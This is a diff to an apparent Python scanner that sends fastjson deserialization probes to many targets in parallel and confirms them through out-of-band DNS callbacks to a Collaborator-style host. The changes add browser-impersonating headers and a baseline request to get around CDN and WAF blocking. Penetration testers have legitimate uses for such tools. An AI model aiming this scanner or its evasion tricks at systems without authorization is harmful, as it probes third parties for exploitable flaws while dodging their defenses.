@@ -125,9 +125,8 @@ def load_targets(path, scheme, port, path_suffix, default_method):
     return out
 
 
-def send(method, url, body, content_type, timeout):
-    req = urllib.request.Request(url, data=body.encode(), method=method,
-                                 headers={"Content-Type": content_type})
+def send(method, url, body, headers, timeout):
+    req = urllib.request.Request(url, data=body.encode(), method=method, headers=headers)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as r:
             return f"HTTP {r.status}"
@@ -157,6 +156,15 @@ def main(argv):
                          "dns = Inet4Address OOB via a DOTTED host (Collaborator-compatible, "
                          "confirms fastjson+egress); both = send each")
     ap.add_argument("--content-type", default="application/json")
+    ap.add_argument("--user-agent",
+                    default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                            "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+                    help="User-Agent (browser-like default — CDNs/WAFs often 405 bare clients)")
+    ap.add_argument("--header", action="append", default=[], metavar="'K: V'",
+                    help="extra request header (repeatable), e.g. --header 'Origin: https://site'")
+    ap.add_argument("--baseline", default=None, metavar="BODY",
+                    help="also send this benign body per target as a reachability control "
+                         "(e.g. '{\"a\":1}') — distinguishes CDN/path 405 from a WAF payload block")
     ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
     ap.add_argument("--timeout", type=float, default=8.0)
     ap.add_argument("--wait", type=float, default=10.0, help="seconds to wait for callbacks (built-in mode)")
@@ -193,16 +201,27 @@ def main(argv):
             obj = make_dns_obj(collab_raw, tok)
             token_map[tok] = (method, url, "dns")
             jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
+        if args.baseline:
+            tok = "b" + base
+            token_map[tok] = (method, url, "baseline")
+            jobs.append((tok, method, url, args.baseline))
+
+    hdrs = {"Content-Type": args.content_type, "User-Agent": args.user_agent, "Accept": "*/*"}
+    for h in args.header:
+        if ":" in h:
+            k, v = h.split(":", 1)
+            hdrs[k.strip()] = v.strip()
 
     workers = max(1, min(args.threads, len(jobs) or 1))
-    print(f"[*] firing {len(jobs)} target(s) with {workers} thread(s)\n")
+    print(f"[*] firing {len(jobs)} request(s) with {workers} thread(s)\n")
     plock = threading.Lock()
 
     def fire(job):
         token, method, url, body = job
-        status = send(method, url, body, args.content_type, args.timeout)
+        kind = token_map[token][2]
+        status = send(method, url, body, hdrs, args.timeout)
         with plock:
-            print(f"    [{token}] {method} {url}  -> {status}")
+            print(f"    [{kind:8} {token}] {method} {url}  -> {status}")
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
         list(pool.map(fire, jobs))
